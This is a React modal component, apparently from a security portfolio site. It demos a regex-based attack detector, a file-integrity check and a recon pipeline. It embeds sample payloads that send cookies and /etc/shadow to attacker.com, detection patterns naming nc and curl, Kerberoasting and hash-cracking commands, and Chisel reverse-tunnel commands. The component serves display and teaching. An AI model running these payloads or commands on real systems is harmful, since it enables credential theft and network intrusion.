import { useState } from 'react';
import {
  X,
  ExternalLink,
  ShieldAlert,
  Cpu,
  Terminal,
  Play,
  FileCheck2,
  AlertTriangle,
  Lock,
  Search,
  BookOpen,
  ArrowRight,
  RefreshCw,
} from 'lucide-react';
import type { Operation } from '../data/operations';
import { soundFx } from '../utils/soundFx';

interface ProjectModalProps {
  operation: Operation | null;
  onClose: () => void;
}

export default function ProjectModal({ operation, onClose }: ProjectModalProps) {
  // ── State for SentinelShield WAF Simulator ──
  const [testPayload, setTestPayload] = useState("' OR '1'='1' --");
  const [simulationResult, setSimulationResult] = useState<{
    status: 'BLOCKED' | 'PASSED';
    cwe: string;
    threatScore: number;
    latency: string;
    action: string;
  } | null>(null);

  // ── State for SFTM Integrity Lab ──
  const [isTampered, setIsTampered] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);

  // ── State for Bug Bounty Pipeline ──
  const [reconStage, setReconStage] = useState<0 | 1 | 2 | 3>(0);

  // ── State for Handbook Explorer ──
  const [selectedChapter, setSelectedChapter] = useState<'ad' | 'suid' | 'pivot'>('ad');

  if (!operation) return null;

  // Run SentinelShield Analysis
  const runSimulation = () => {
    soundFx.playAuth();
    const isSQLi = /('|"|--|union|select|insert|update|delete|drop|or\s+1=1)/i.test(testPayload);
    const isXSS = /(<script|javascript:|onerror=|onload=|alert\(|<img|<svg)/i.test(testPayload);
    const isPathTraversal = /(\.\.\/|\.\.\\|\/etc\/passwd)/i.test(testPayload);
    const isCmdInj = /(;|\||`|\$\(|\/bin\/sh|\/bin\/bash|nc\s+|curl\s+)/i.test(testPayload);

    if (isSQLi || isXSS || isPathTraversal || isCmdInj) {
      setSimulationResult({
        status: 'BLOCKED',
        cwe: isSQLi
          ? 'CWE-89: SQL Injection'
          : isXSS
          ? 'CWE-79: Cross-Site Scripting'
          : isPathTraversal
          ? 'CWE-22: Path Traversal'
          : 'CWE-78: OS Command Injection',
        threatScore: isSQLi ? 98 : isCmdInj ? 99 : 94,
        latency: '2.4ms',
        action: '403 FORBIDDEN // IP Rate-Limited & Alert Dispatched',
      });
    } else {
      setSimulationResult({
        status: 'PASSED',
        cwe: 'None (Benign Pattern)',
        threatScore: 4,
        latency: '1.8ms',
        action: '200 OK // Routed to Upstream Microservice',
      });
    }
  };

  // Trigger SFTM Tamper Simulation
  const triggerTamper = () => {
    soundFx.playCyberBlip();
    setIsTransferring(true);
    setTimeout(() => {
      setIsTampered((prev) => !prev);
      setIsTransferring(false);
    }, 400);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-md animate-fade-in-up">
      <div className="bg-white border-2 border-[#111111] rounded-[28px] max-w-[800px] w-full max-h-[92vh] overflow-y-auto shadow-2xl p-6 sm:p-8 md:p-10 relative">
        {/* Close Button */}
        <button
          onClick={() => {
            soundFx.playClick();
            onClose();
          }}
          className="absolute top-6 right-6 p-2.5 rounded-full border border-[#ddd] hover:bg-[#080808] hover:text-white text-[#080808] transition-colors cursor-pointer"
          aria-label="Close modal"
        >
          <X size={18} />
        </button>

        {/* Header */}
        <div className="mb-6 pr-10">
          <div className="flex items-center gap-2 mb-2">
            <span className="text-[11px] font-black tracking-[0.16em] uppercase px-3 py-1 rounded bg-[#080808] text-white">
              OPERATION {operation.number} // {operation.category}
            </span>
            <span className="text-[11px] font-black tracking-[0.14em] text-[#16a34a] uppercase flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-[#16a34a] animate-pulse" />
              {operation.status}
            </span>
          </div>

          <h2 className="text-[28px] md:text-[34px] font-[900] uppercase text-[#080808] leading-tight mb-2 tracking-tight">
            {operation.title}
          </h2>

          <p className="text-[15px] text-[#444] leading-relaxed font-medium">
            {operation.description}
          </p>
        </div>

        {/* Key Metrics Grid */}
        {operation.stats && (
          <div className="grid grid-cols-3 gap-3 mb-8 p-4 bg-[#f6f6f6] border border-[#e5e5e5] rounded-2xl">
            {operation.stats.map((s, i) => (
              <div key={i} className="text-center">
                <div className="text-[11px] font-black uppercase tracking-wider text-[#666] mb-0.5">{s.label}</div>
                <div className="text-[18px] font-black text-[#080808] font-mono">{s.value}</div>
              </div>
            ))}
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════
            PROJECT 1: SENTINELSHIELD LIVE MULTI-VECTOR ATTACK SIMULATOR
           ══════════════════════════════════════════════════════════════ */}
        {operation.id === 'sentinelshield' && (
          <div className="mb-8 p-6 bg-[#0c0d0e] rounded-2xl text-white border border-[#222]">
            <div className="flex items-center justify-between mb-4 pb-2 border-b border-[#222]">
              <div className="text-[12px] font-black tracking-widest uppercase flex items-center gap-2 text-[#4ade80]">
                <Terminal size={16} />
                <span>SENTINELSHIELD LIVE ATTACK SIMULATOR</span>
              </div>
              <span className="text-[10px] bg-[#1a1a1a] text-[#aaa] px-2.5 py-0.5 rounded font-mono">
                ENGINE V2.4 // LATENCY &lt;4MS
              </span>
            </div>

            <div className="space-y-4">
              {/* Preset Vectors */}
              <div>
                <div className="text-[10px] font-mono uppercase text-[#888] mb-2 font-bold">
                  Select Attack Vector Preset:
                </div>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  {[
                    { label: 'SQLi Union', payload: "' UNION SELECT 1, user(), database() --" },
                    { label: 'XSS Polyglot', payload: "<script>fetch('http://attacker.com?c='+document.cookie)</script>" },
                    { label: 'Path Traversal', payload: '../../../../../../etc/passwd%00' },
                    { label: 'Command Inj.', payload: '; cat /etc/shadow | nc attacker.com 4444' },
                  ].map((vec, i) => (
                    <button
                      key={i}
                      onClick={() => {
                        setTestPayload(vec.payload);
                        setSimulationResult(null);
                      }}
                      className="px-2.5 py-1.5 bg-[#181818] hover:bg-[#252525] border border-[#333] rounded-lg text-[#ddd] text-[11px] font-mono text-left truncate transition-colors cursor-pointer"
                    >
                      {vec.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Input and Test Button */}
              <div className="flex gap-2">
                <input
                  type="text"
                  value={testPayload}
                  onChange={(e) => setTestPayload(e.target.value)}
                  placeholder="Type custom SQLi, XSS, or Command Injection payload..."
                  className="flex-1 bg-[#141517] border border-[#333] rounded-xl px-4 py-2.5 text-[12px] font-mono text-white outline-none focus:border-[#4ade80]"
                />
                <button
                  onClick={runSimulation}
                  className="px-5 py-2.5 bg-white text-black font-black text-[12px] uppercase tracking-wider rounded-xl flex items-center gap-1.5 hover:bg-[#e0e0e0] transition-all cursor-pointer shadow-md"
                >
                  <Play size={13} fill="currentColor" /> Test
                </button>
              </div>

              {/* Real-Time Telemetry Decision Box */}
              {simulationResult && (
                <div
                  className={`p-4 rounded-xl border font-mono text-[11px] space-y-1.5 ${
                    simulationResult.status === 'BLOCKED'
                      ? 'bg-[#180d0d] border-[#dc2626]/40 text-[#fca5a5]'
                      : 'bg-[#0d1810] border-[#16a34a]/40 text-[#86efac]'
                  }`}
                >
                  <div className="flex items-center justify-between pb-1 border-b border-white/10 font-black">
                    <span className="flex items-center gap-1.5">
                      {simulationResult.status === 'BLOCKED' ? (
                        <ShieldAlert size={14} className="text-[#f87171]" />
                      ) : (
                        <FileCheck2 size={14} className="text-[#4ade80]" />
                      )}
                      <span>DECISION: {simulationResult.status}</span>
                    </span>
                    <span className="text-[#aaa] text-[10px]">EXECUTION TIME: {simulationResult.latency}</span>
                  </div>
                  <div>&gt;&gt; SIGNATURE: <span className="font-bold text-white">{simulationResult.cwe}</span></div>
                  <div>&gt;&gt; THREAT SCORE: <span className="font-bold text-white">{simulationResult.threatScore} / 100</span></div>
                  <div>&gt;&gt; MITIGATION: <span className="font-bold text-white">{simulationResult.action}</span></div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════
            PROJECT 2: SFTM LIVE CRYPTOGRAPHIC TAMPER & QUARANTINE LAB
           ══════════════════════════════════════════════════════════════ */}
        {operation.id === 'secure-file-transfer' && (
          <div className="mb-8 p-6 bg-[#0c0d0e] rounded-2xl text-white border border-[#222]">
            <div className="flex items-center justify-between mb-4 pb-2 border-b border-[#222]">
              <div className="text-[12px] font-black tracking-widest uppercase flex items-center gap-2 text-[#38bdf8]">
                <Lock size={16} />
                <span>SFTM CRYPTOGRAPHIC INTEGRITY &amp; QUARANTINE LAB</span>
              </div>
              <span className="text-[10px] bg-[#1a1a1a] text-[#aaa] px-2.5 py-0.5 rounded font-mono">
                SHA-256 AUDIT ENGINE
              </span>
            </div>

            <div className="space-y-4">
              {/* Spool Channel Info */}
              <div className="bg-[#141517] p-3.5 rounded-xl border border-[#222] font-mono text-[11px] space-y-1">
                <div className="flex justify-between text-[#888]">
                  <span>SPOOL FILE: <span className="text-white">audit_payload_2026.enc (4.2 MB)</span></span>
                  <span>PROTOCOL: <span className="text-[#38bdf8]">SFTP Port 22 (TLS 1.3)</span></span>
                </div>
                <div className="truncate">
                  EXPECTED SHA-256: <span className="text-[#4ade80]">9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08</span>
                </div>
                <div className="truncate">
                  ACTUAL INGESTED :{' '}
                  <span className={isTampered ? 'text-[#f87171] font-black underline' : 'text-[#4ade80]'}>
                    {isTampered
                      ? 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 [CORRUPTED]'
                      : '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 [MATCHED]'}
                  </span>
                </div>
              </div>

              {/* Status Alert */}
              <div
                className={`p-3.5 rounded-xl border font-mono text-[11px] flex items-center justify-between ${
                  isTampered
                    ? 'bg-[#220d0d] border-[#dc2626] text-[#fca5a5]'
                    : 'bg-[#0d1f12] border-[#16a34a] text-[#86efac]'
                }`}
              >
                <div className="flex items-center gap-2">
                  {isTampered ? <AlertTriangle size={16} className="text-[#ef4444]" /> : <FileCheck2 size={16} className="text-[#22c55e]" />}
                  <span className="font-bold">
                    {isTampered
                      ? 'SECURITY BREACH: HASH MISMATCH DETECTED // FILE QUARANTINED'
                      : 'INTEGRITY VERIFIED: 100% UNTAMPERED HASH MATCH'}
                  </span>
                </div>
                <span className="text-[10px] font-black">{isTampered ? 'MITRE T1048' : 'ZERO-TAMPER'}</span>
              </div>

              {/* Action Button */}
              <button
                onClick={triggerTamper}
                disabled={isTransferring}
                className="w-full py-2.5 bg-[#222] hover:bg-[#333] border border-[#444] rounded-xl text-white text-[12px] font-mono font-bold flex items-center justify-center gap-2 cursor-pointer transition-all"
              >
                <RefreshCw size={14} className={isTransferring ? 'animate-spin' : ''} />
                <span>{isTampered ? 'Restore Valid SHA-256 Digest' : 'Simulate 1-Bit In-Flight MITM Tamper'}</span>
              </button>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════
            PROJECT 3: BUG BOUNTY RECON DAG PIPELINE & DISCLOSURE REPLAYER
           ══════════════════════════════════════════════════════════════ */}
        {operation.id === 'bug-bounty-research' && (
          <div className="mb-8 p-6 bg-[#0c0d0e] rounded-2xl text-white border border-[#222]">
            <div className="flex items-center justify-between mb-4 pb-2 border-b border-[#222]">
              <div className="text-[12px] font-black tracking-widest uppercase flex items-center gap-2 text-[#fbbf24]">
                <Search size={16} />
                <span>AUTOMATED RECON DAG &amp; CWE-306 REPLAY</span>
              </div>
              <span className="text-[10px] bg-[#1a1a1a] text-[#aaa] px-2.5 py-0.5 rounded font-mono">
                HACKERONE DISCLOSURE
              </span>
            </div>

            {/* Interactive Pipeline Steps */}
            <div className="grid grid-cols-4 gap-2 mb-4 font-mono text-[10px]">
              {[
                { stage: 0, label: '1. Subfinder' },
                { stage: 1, label: '2. Httpx Probe' },
                { stage: 2, label: '3. Nuclei Scan' },
                { stage: 3, label: '4. CWE-306 POC' },
              ].map((s) => (
                <button
                  key={s.stage}
                  onClick={() => setReconStage(s.stage as any)}
                  className={`py-2 px-2 rounded-lg text-center font-bold border transition-all cursor-pointer ${
                    reconStage === s.stage
                      ? 'bg-white text-black border-white'
                      : 'bg-[#141517] text-[#888] border-[#262626] hover:border-[#444]'
                  }`}
                >
                  {s.label}
                </button>
              ))}
            </div>

            {/* Interactive Step Details */}
            <div className="bg-[#141517] p-4 rounded-xl border border-[#222] font-mono text-[11px] space-y-2">
              {reconStage === 0 && (
                <div>
                  <div className="text-[#fbbf24] font-bold mb-1">&gt; subfinder -d target.com -all -silent</div>
                  <div className="text-[#aaa]">Resolved 3,420 unique hostnames across passive ASN feeds &amp; Certificate Transparency logs.</div>
                </div>
              )}
              {reconStage === 1 && (
                <div>
                  <div className="text-[#fbbf24] font-bold mb-1">&gt; httpx -l subdomains.txt -ports 80,443,8080,8443 -title -status-code</div>
                  <div className="text-[#aaa]">Identified 812 active web nodes. Flagged internal comms microservice exposing WebSocket endpoint: <code>/ws/telemetry</code>.</div>
                </div>
              )}
              {reconStage === 2 && (
                <div>
                  <div className="text-[#fbbf24] font-bold mb-1">&gt; nuclei -t websocket/ -u https://target-node.com</div>
                  <div className="text-[#aaa]">Detected missing token validation on HTTP Upgrade handshake (<code>Connection: Upgrade</code>, <code>Upgrade: websocket</code>).</div>
                </div>
              )}
              {reconStage === 3 && (
                <div>
                  <div className="text-[#f87171] font-bold mb-1">&gt; POC: WebSocket Broken Authentication (CWE-306)</div>
                  <div className="text-[#aaa] leading-relaxed">
                    Demonstrated unauthorized socket connection without session cookie or JWT token. Subscribed to internal broadcast stream, obtaining real-time telemetry. <span className="text-[#4ade80] font-bold">Status: Awarded &amp; Resolved by Vendor.</span>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════════════
            PROJECT 4: OFFENSIVE SECURITY HANDBOOK CHAPTER EXPLORER
           ══════════════════════════════════════════════════════════════ */}
        {operation.id === 'offensive-security-handbook' && (
          <div className="mb-8 p-6 bg-[#0c0d0e] rounded-2xl text-white border border-[#222]">
            <div className="flex items-center justify-between mb-4 pb-2 border-b border-[#222]">
              <div className="text-[12px] font-black tracking-widest uppercase flex items-center gap-2 text-[#c084fc]">
                <BookOpen size={16} />
                <span>OFFENSIVE HANDBOOK TRADECRAFT EXPLORER</span>
              </div>
              <span className="text-[10px] bg-[#1a1a1a] text-[#aaa] px-2.5 py-0.5 rounded font-mono">
                15 VOLUMES MANUAL
              </span>
            </div>

            {/* Chapter Selection */}
            <div className="flex gap-2 mb-4 font-mono text-[11px]">
              {[
                { id: 'ad', label: 'Ch. 04 Active Directory' },
                { id: 'suid', label: 'Ch. 07 Linux SUID PrivEsc' },
                { id: 'pivot', label: 'Ch. 12 Chisel Pivoting' },
              ].map((ch) => (
                <button
                  key={ch.id}
                  onClick={() => setSelectedChapter(ch.id as any)}
                  className={`flex-1 py-2 px-3 rounded-lg font-bold border transition-all cursor-pointer text-center truncate ${
                    selectedChapter === ch.id
                      ? 'bg-white text-black border-white'
                      : 'bg-[#141517] text-[#888] border-[#262626] hover:border-[#444]'
                  }`}
                >
                  {ch.label}
                </button>
              ))}
            </div>

            {/* Chapter Code & Methodology Box */}
            <div className="bg-[#141517] p-4 rounded-xl border border-[#222] font-mono text-[11px] space-y-2">
              {selectedChapter === 'ad' && (
                <>
                  <div className="text-[#c084fc] font-bold">&gt;&gt; KERBEROASTING &amp; SPN EXTRACTION</div>
                  <pre className="text-[#eee] bg-[#0c0d0e] p-2.5 rounded-lg border border-[#222] overflow-x-auto">
                    impacket-GetUserSPNs -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile hashes.kerb
                    hashcat -m 13100 -a 0 hashes.kerb /usr/share/wordlists/rockyou.txt
                  </pre>
                  <div className="text-[#888] text-[10px]">Defense: Enforce AES-256 Kerberos encryption keys and deploy Managed Service Accounts (gMSA).</div>
                </>
              )}
              {selectedChapter === 'suid' && (
                <>
                  <div className="text-[#c084fc] font-bold">&gt;&gt; LINUX SUID &amp; CAPABILITY AUDITING</div>
                  <pre className="text-[#eee] bg-[#0c0d0e] p-2.5 rounded-lg border border-[#222] overflow-x-auto">
                    find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;
                    getcap -r / 2&gt;/dev/null
                  </pre>
                  <div className="text-[#888] text-[10px]">Methodology: Audit binary execution paths for relative PATH hijack vulnerabilities and GTFOBins bypasses.</div>
                </>
              )}
              {selectedChapter === 'pivot' && (
                <>
                  <div className="text-[#c084fc] font-bold">&gt;&gt; REVERSE SOCKS5 TUNNELING VIA CHISEL</div>
                  <pre className="text-[#eee] bg-[#0c0d0e] p-2.5 rounded-lg border border-[#222] overflow-x-auto">
                    # Attacker Rig
                    ./chisel server -p 8000 --reverse
                    # Compromised Target Host
                    ./chisel client 10.10.14.5:8000 R:socks
                  </pre>
                  <div className="text-[#888] text-[10px]">Methodology: Establish reverse encrypted SOCKS5 proxy through perimeter firewalls into isolated subnets.</div>
                </>
              )}
            </div>
          </div>
        )}

        {/* Technical Architecture & MITRE ATT&CK Mapping */}
        {operation.details && (
          <div className="space-y-6 mb-8">
            <div>
              <h3 className="text-[13px] font-black uppercase tracking-[0.14em] text-[#080808] mb-3 flex items-center gap-2">
                <Cpu size={16} /> Engineering Architecture &amp; Methodology
              </h3>
              <ul className="space-y-2">
                {operation.details.architecture.map((item, idx) => (
                  <li key={idx} className="text-[14px] text-[#333] flex items-start gap-2 font-medium">
                    <span className="text-[#080808] font-bold">▪</span>
                    <span>{item}</span>
                  </li>
                ))}
              </ul>
            </div>

            {operation.details.mitreMapping && (
              <div>
                <h3 className="text-[13px] font-black uppercase tracking-[0.14em] text-[#080808] mb-2.5 flex items-center gap-2">
                  <ShieldAlert size={16} /> MITRE ATT&amp;CK Matrix Mapping
                </h3>
                <div className="flex flex-wrap gap-2">
                  {operation.details.mitreMapping.map((mitre) => (
                    <span
                      key={mitre}
                      className="text-[12px] font-mono font-bold px-3.5 py-1.5 bg-[#080808] text-white rounded-lg"
                    >
                      {mitre}
                    </span>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Action Buttons */}
        <div className="flex items-center justify-between pt-5 border-t-2 border-[#eee]">
          <div className="text-[12px] text-[#555] font-bold">
            Technologies: {operation.technologies.join(' · ')}
          </div>

          {operation.link && (
            <a
              href={operation.link}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-2 px-6 py-3 rounded-full bg-[#080808] text-white text-[12px] font-black tracking-wider uppercase hover:bg-[#222] transition-colors shadow-sm"
            >
              <span>View Source on GitHub</span>
              <ExternalLink size={13} strokeWidth={2.5} />
            </a>
          )}
        </div>
      </div>
    </div>
  );
}
